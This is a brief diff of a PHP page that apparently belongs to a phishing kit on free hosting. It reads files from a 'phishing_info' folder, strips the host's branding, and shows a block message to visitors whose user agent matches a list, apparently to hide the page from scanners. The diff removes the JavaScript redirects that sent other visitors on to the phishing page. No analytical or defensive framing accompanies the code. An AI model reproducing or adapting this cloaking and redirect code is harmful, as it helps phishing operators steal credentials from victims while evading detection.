@@ -1,6 +1,5 @@
 <?php
 echo'<link rel=stylesheet type=text/css href="./remove branding logo/000webhost.css">';
-echo "<script>filename = './phishing_info/'+window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);</script>";
 
 $lib ='./phishing_info/'.basename(__FILE__);
 
@@ -47,6 +46,5 @@ echo"<center><h1>Some words in your <mark>user_agent</mark> matched with our lis
 <input type=hidden name=link value=".$redirect.">
 <input type=hidden name=location value=Sample />
 */
-}else{echo'<script>window.location.replace(filename);</script>';}}
-else{echo'<script>window.location.replace(filename);</script>';}}
-else{echo'<script>window.location.replace(filename);</script>';}?>
+}}}
+?>
